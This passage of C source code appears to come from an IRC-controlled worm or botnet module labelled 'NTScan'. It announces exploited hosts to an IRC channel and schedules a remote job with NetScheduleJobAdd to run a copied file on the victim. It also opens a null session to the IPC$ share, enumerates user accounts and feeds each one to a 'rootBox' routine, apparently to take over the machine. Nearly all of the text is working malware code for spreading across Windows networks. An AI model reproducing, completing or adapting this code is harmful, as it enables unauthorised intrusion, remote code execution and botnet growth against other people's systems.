							    } 
			                       else irc_sendf2(sock2, "PRIVMSG %s :[NTScan - Exploited %s] CSendFile: %s\r\n",channel,szIP); 
							}
							else irc_sendf2(sock2, "PRIVMSG %s :[NTScan - Exploited %s] CSendFile: %s\r\n",channel,szIP);
					
						}
						else irc_sendf2(sock2, "PRIVMSG %s :[NTScan - Exploited - WinXP %s] CSendFile: %s\r\n",channel,szIP);
				} 
				else irc_sendf2(sock2, "PRIVMSG %s :[NTScan - Exploited - WinNT %s] CSendFile: %s\r\n",channel,szIP); 
			} 
			else irc_sendf2(sock2, "PRIVMSG %s :[NTScan - Exploited %s] CSendFile: %s\r\n",channel,szIP); 


			memset(&at_time,0,sizeof(AT_INFO));
			DWORD jobtime;
			jobtime=tinfo->tod_elapsedt / 60;
			jobtime-=tinfo->tod_timezone;
			jobtime+=2;
			jobtime%=(24*60);
			at_time.JobTime=jobtime*60000;
			at_time.Command=L"%s",filename;

			nStatus=fNetScheduleJobAdd(wszNetbios,(BYTE *)&at_time,&JobID);
		
		}
	}
	WNetCancelConnection2(szIP,CONNECT_UPDATE_PROFILE,TRUE);
	return TRUE;
}

void enumusers(char *szServer)
{
	LPUSER_INFO_0 pBuf = NULL;
	LPUSER_INFO_0 pTmpBuf;
	DWORD dwLevel = 0;
	DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
	DWORD dwEntriesRead = 0;
	DWORD dwTotalEntries = 0;
	DWORD dwResumeHandle = 0;
	DWORD i;
	DWORD dwTotalCount = 0;
	NET_API_STATUS nStatus;
	WCHAR  *pszServerName = NULL;
	WCHAR sName[500];
	MultiByteToWideChar(CP_ACP,0,szServer,-1,sName,sizeof(sName));
	pszServerName=sName;
	char szUsername[300];
	char RemoteName[200];
	
	NETRESOURCE nr;
	nr.lpLocalName=NULL;
	nr.lpProvider=NULL;
	nr.dwType=RESOURCETYPE_ANY;
	sprintf(RemoteName,"%s\\ipc$",szServer);
	nr.lpRemoteName=RemoteName;
	if (WNetAddConnection2(&nr,"","",0)!=NO_ERROR) {
		WNetCancelConnection2(RemoteName,0,TRUE);
		return;
	}
	
	do // begin do
	{
		nStatus = fNetUserEnum(pszServerName,
			dwLevel,
			FILTER_NORMAL_ACCOUNT, // global users
			(LPBYTE*)&pBuf,
			dwPrefMaxLen,
			&dwEntriesRead,
			&dwTotalEntries,
			&dwResumeHandle);
		WNetCancelConnection2(RemoteName,0,TRUE);
		//
		// If the call succeeds,
		//
		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))
		{
			if ((pTmpBuf = pBuf) != NULL)
			{
				for (i = 0; (i < dwEntriesRead); i++)
				{
					if (pTmpBuf == NULL) break;
					WideCharToMultiByte(CP_ACP,0,pTmpBuf->usri0_name,-1,szUsername,sizeof(szUsername),NULL,NULL);
					if ((rootBox(szUsername,szServer))==TRUE) break;
					pTmpBuf++;
					dwTotalCount++;
				}
			}
		}
		if (pBuf != NULL)
		{
			fNetApiBufferFree(pBuf);
			pBuf = NULL;
		}
	}
	while (nStatus == ERROR_MORE_DATA); // end do
	if (pBuf != NULL) fNetApiBufferFree(pBuf);
	
	return;
}
